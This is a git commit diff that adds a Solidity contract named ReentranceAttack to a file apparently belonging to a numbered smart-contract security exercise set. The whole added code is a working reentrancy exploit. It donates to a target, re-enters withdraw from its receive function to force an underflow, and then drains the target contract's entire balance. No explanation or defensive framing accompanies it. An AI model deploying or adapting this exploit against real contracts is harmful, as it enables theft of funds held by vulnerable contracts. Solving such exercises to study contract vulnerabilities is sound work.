b11e1fb894dbd1450d1262460f9806b42d03be1b
zhou <1036767219@qq.com>
2023-02-01 20:25:53 +0800

    update att

--- 11_Re-entrancy.sol
+++ 11_Re-entrancy.sol
@@ -60,3 +60,25 @@ contract att {
     a.withdraw(1 ether);
   }
 }
+
+contract ReentranceAttack {
+
+  Reentrance target;
+
+  constructor(address payable _target) public payable {
+    target = Reentrance(_target);
+  }
+
+  function attack_1_causeOverflow() public {
+    target.donate{value:1}(address(this));
+    target.withdraw(1);
+  }
+
+  function attack_2_deplete() public {
+    target.withdraw(address(target).balance);
+  }
+
+  receive() external payable {
+    target.withdraw(1);
+  }
+}
